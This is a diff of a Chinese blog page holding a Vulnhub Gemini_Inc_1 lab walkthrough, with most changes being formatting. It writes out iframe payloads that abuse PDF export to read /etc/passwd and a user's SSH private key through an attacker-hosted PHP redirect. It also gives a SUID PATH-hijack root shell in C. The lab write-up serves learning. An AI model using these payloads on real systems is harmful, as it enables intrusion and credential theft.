@@ -115,30 +115,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/05/01/18%20Vulnhub%20Narak%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/&text=19 Vulnhub Gemini_Inc_1 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/&title=19 Vulnhub Gemini_Inc_1 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/&is_video=false&description=19 Vulnhub Gemini_Inc_1 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=19 Vulnhub Gemini_Inc_1 Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/&title=19 Vulnhub Gemini_Inc_1 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/&title=19 Vulnhub Gemini_Inc_1 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/&title=19 Vulnhub Gemini_Inc_1 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/&title=19 Vulnhub Gemini_Inc_1 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/&name=19 Vulnhub Gemini_Inc_1 Writeup&description=&lt;p&gt;该靶机难度中等，但不论是get shell还是本地提权，都学习到了新的知识。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/02/19%20Vulnhub%20Gemini_Inc_1%20Writeup/&t=19 Vulnhub Gemini_Inc_1 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
     </div>
@@ -165,8 +147,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-01T16:00:00.000Z" itemprop="datePublished">2022-05-02</time>
-        
-        (Updated: <time datetime="2022-05-02T15:46:41.723Z" itemprop="dateModified">2022-05-02</time>)
         
       
     </div>
@@ -228,9 +208,7 @@
 <p>kali: 192.168.100.10 靶机: 192.168.100.21</p>
 <p>因为在测试</p>
 <h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
-<span class="token function">sudo</span> nmap -p- <span class="token number">192.168</span>.100.20
-<span class="token function">sudo</span> nmap -p22,80 -A <span class="token number">192.168</span>.100.20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.20</span><br><span class="line">sudo nmap -p22,80 -A 192.168.100.20</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502220323.png" /></p>
 <p>信息：</p>
 <ol type="1">
@@ -249,8 +227,7 @@
 </ol>
 <p>访问源码，里面有许多文件，其中有一个install.php的文件，根据介绍，搭建该网站需要运行该文件，因此查看</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502220856.png" /></p>
-<p>发现存在信息： <pre class="line-numbers language-none"><code class="language-none">user: admin
-password: 1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>发现存在信息： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user: admin</span><br><span class="line">password: 1234</span><br></pre></td></tr></table></figure></p>
 <p>成功登录admin用户。在登录的界面发现了两个功能点：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502221024.png" /></p>
 <p>并且修改profile，可以将内容直接显示到该页面，因此可能存在XSS或者SSTI，SSTI可以排除，因为并没有用到什么模板，因此重点看一下是否存在XSS。经过测试，在display name这里输入脚本的时候成功执行</p>
@@ -265,27 +242,18 @@ password: 1234<span aria-hidden="true" class="line-numbers-rows"><span></span><s
 <li><a target="_blank" rel="noopener" href="https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/">wkhtmltopdf File Inclusion Vulnerability - Virtue Security</a></li>
 <li><a target="_blank" rel="noopener" href="http://hassankhanyusufzai.com/SSRF-to-LFI/">SSRF to Local File Read - Hassan Khan Security Researcher</a></li>
 </ul>
-<p>首先，测试本地文件包含： <pre class="line-numbers language-none"><code class="language-none">display name: &lt;iframe src&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; width&#x3D;400 height&#x3D;600&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>并没有读取到内容。接着尝试远程文件包含：（尝试这一步之后就无法在点击actions了，需要重装虚拟机） <pre class="line-numbers language-none"><code class="language-none">先在kali的&#x2F;var&#x2F;www&#x2F;html目录下随便创建一个文件，并且输入随机内容
-&#x2F;&#x2F; &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt
-
-然后开启Apache2: systemctl start apache2
-
-接着：
-display name: &lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;192.168.100.10&#x2F;1.txt&quot;&gt;&lt;&#x2F;iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>首先，测试本地文件包含： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">display name: &lt;iframe src=&quot;file:///etc/passwd&quot; width=400 height=600&gt;</span><br></pre></td></tr></table></figure></p>
+<p>并没有读取到内容。接着尝试远程文件包含：（尝试这一步之后就无法在点击actions了，需要重装虚拟机） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">先在kali的/var/www/html目录下随便创建一个文件，并且输入随机内容</span><br><span class="line">// /var/www/html/1.txt</span><br><span class="line"></span><br><span class="line">然后开启Apache2: systemctl start apache2</span><br><span class="line"></span><br><span class="line">接着：</span><br><span class="line">display name: &lt;iframe src=&quot;http://192.168.100.10/1.txt&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502222416.png" /></p>
 <p>可以进行远程文件包含。</p>
 <p>最后的利用方式：</p>
 <ol type="1">
 <li><p>现在kali上编写一个php文件，内容为</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:file://<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">header(<span class="string">&quot;location:file://<span class="subst">$filename</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
 <li><p>kali开启php 服务端</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php -S <span class="token number">0.0</span>.0.0:4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:4444</span><br></pre></td></tr></table></figure></li>
 <li><p>修改display name</p>
-<pre class="line-numbers language-none"><code class="language-none">display name: &lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;192.168.100.10:4444&#x2F;1.php?file&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;&#x2F;iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">display name: &lt;iframe src=&quot;http://192.168.100.10:4444/1.php?file=/etc/passwd&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></li>
 <li><p>导出为pdf之后就能够看到/etc/passwd的内容了</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502231024.png" /></p></li>
 </ol>
@@ -294,71 +262,28 @@ display name: &lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;192.168.100.10&#x2F;1.t
 </blockquote>
 <p>接下来想到如果geminni1用户可以ssh公钥认证登陆的话，必定会存在id_rsa, id_rsa.pub, authorized_keys。并且路径为/home/gemini1/.ssh。只要我们拿到密钥，也就是id_rsa，即可不用密码登录。</p>
 <p>id_rsa.pub和authorized_keys的内容一致，都是公钥，因此可以将三个都读取下来验证一下，想要使用ssh公钥认证登录，就必须将公钥改名为authorized_keys!</p>
-<p>将display name修改为如下： <pre class="line-numbers language-none"><code class="language-none">&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;192.168.100.10:4444&#x2F;1.php?file&#x3D;&#x2F;home&#x2F;gemini1&#x2F;.ssh&#x2F;id_rsa&quot; width&#x3D;800 height&#x3D;1000&gt;&lt;&#x2F;iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>将display name修改为如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://192.168.100.10:4444/1.php?file=/home/gemini1/.ssh/id_rsa&quot; width=800 height=1000&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502231445.png" /></p>
-<p>然后利用ssh登录 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">600</span> id_rsa
-<span class="token function">ssh</span> gemini1@192.168.100.20 -i id_rsa
-
-注意：用什么用户创建的id_rsa就用什么用户登录！！看id_rsa的属主<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>然后利用ssh登录 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh gemini1@192.168.100.20 -i id_rsa</span><br><span class="line"></span><br><span class="line">注意：用什么用户创建的id_rsa就用什么用户登录！！看id_rsa的属主</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502232611.png" /></p>
 <h2 id="权限提升">2.4. 权限提升</h2>
-<p>本题使用的suid提权，首先输入如下命令查看拥有suid权限，并且属主为root的文件： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -type f -user root -perm -u<span class="token operator">=</span>s -ls <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>本题使用的suid提权，首先输入如下命令查看拥有suid权限，并且属主为root的文件： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -user root -perm -u=s -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502232914.png" /></p>
 <p>其他文件都是Linux自带的，只有红框这个不是，因此运行此文件看一下内容</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502233009.png" /></p>
-<p>还想右边的内容像是调用了Linux自带的命令，尤其最后一行像是date。因此利用strings命令查看一下该文件的内容 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /usr/bin/listinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>还想右边的内容像是调用了Linux自带的命令，尤其最后一行像是date。因此利用strings命令查看一下该文件的内容 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /usr/bin/listinfo</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502233139.png" /></p>
 <p>可以分别执行这三条命令，会发现就是执行listinfo后右边显示的内容。注意到前三条都使用了绝对路径，而date没有使用，说明环境变量中可以找到date的目录。这就是我们可以利用的点。</p>
 <hr />
 <p>我们可以添加gemini1的家目录为环境变量，要放在date目录的前面，因为当执行date的时候，会顺着环境变量中的目录依次查看该目录下是否有可执行文件date，如果有，则执行，没有就查看下一个目录，如果全部目录都便利完都没有则报错。</p>
 <p>因此，我们添加的目录必须在原来date目录的前面，然后在gemini1的家目录下创建一个date可执行文件，这样系统就会优先执行我们创建的date。</p>
 <hr />
-<p>添加环境变量： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/home/gemini1:<span class="token environment constant">$PATH</span> <span class="token comment"># 冒号为PATH中的分隔符，这样子表示将/home/gemini1添加在原来PATH的最前面</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>在/home/gemini1目录下，编写文件，并编译为可执行文件 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-	<span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc date.c -o <span class="token function">date</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>添加环境变量： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/home/gemini1:<span class="variable">$PATH</span> <span class="comment"># 冒号为PATH中的分隔符，这样子表示将/home/gemini1添加在原来PATH的最前面</span></span><br></pre></td></tr></table></figure></p>
+<p>在/home/gemini1目录下，编写文件，并编译为可执行文件 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setuid(<span class="number">0</span>);</span><br><span class="line">	setgid(<span class="number">0</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc date.c -o date</span><br></pre></td></tr></table></figure>
 <p>最后，执行/usr/bin/listinfo，成功提权。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220502234100.png" /></p>
-<p>接下来查看flag： <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; &#x2F;root&#x2F;flag.txt
-
-displaying current date...    mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
-
-displaying current date...    
-
-displaying current date...    Congratulations on solving this boot2root machine!
-
-displaying current date...    Cheers!
-
-displaying current date...             _.._..,_,_
-
-displaying current date...            (          )
-
-displaying current date...             ]~,&quot;-.-~~[
-
-displaying current date...           .&#x3D;])&#39; (;  ([
-
-displaying current date...           | ]:: &#39;    [
-
-displaying current date...           &#39;&#x3D;]): .)  ([
-
-displaying current date...             |:: &#39;    |
-
-displaying current date...              ~~----~~
-
-displaying current date...    https:&#x2F;&#x2F;twitter.com&#x2F;sec_9emin1
-
-displaying current date...    https:&#x2F;&#x2F;scriptkidd1e.wordpress.com
-
-displaying current date...    
-
-displaying current date...    mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>接下来查看flag： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// /root/flag.txt</span><br><span class="line"></span><br><span class="line">displaying current date...    mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm</span><br><span class="line"></span><br><span class="line">displaying current date...    </span><br><span class="line"></span><br><span class="line">displaying current date...    Congratulations on solving this boot2root machine!</span><br><span class="line"></span><br><span class="line">displaying current date...    Cheers!</span><br><span class="line"></span><br><span class="line">displaying current date...             _.._..,_,_</span><br><span class="line"></span><br><span class="line">displaying current date...            (          )</span><br><span class="line"></span><br><span class="line">displaying current date...             ]~,&quot;-.-~~[</span><br><span class="line"></span><br><span class="line">displaying current date...           .=])&#x27; (;  ([</span><br><span class="line"></span><br><span class="line">displaying current date...           | ]:: &#x27;    [</span><br><span class="line"></span><br><span class="line">displaying current date...           &#x27;=]): .)  ([</span><br><span class="line"></span><br><span class="line">displaying current date...             |:: &#x27;    |</span><br><span class="line"></span><br><span class="line">displaying current date...              ~~----~~</span><br><span class="line"></span><br><span class="line">displaying current date...    https://twitter.com/sec_9emin1</span><br><span class="line"></span><br><span class="line">displaying current date...    https://scriptkidd1e.wordpress.com</span><br><span class="line"></span><br><span class="line">displaying current date...    </span><br><span class="line"></span><br><span class="line">displaying current date...    mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm</span><br></pre></td></tr></table></figure></p>
 <p>成为root之后，所有的输出都会带上一行左边的内容，这应该是/usr/bin/listinfo中date那行的内容。</p>
 <h1 id="总结">3. 总结</h1>
 <p>通过对该靶机的渗透，学到了许多东西：</p>
@@ -423,7 +348,6 @@ displaying current date...    mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
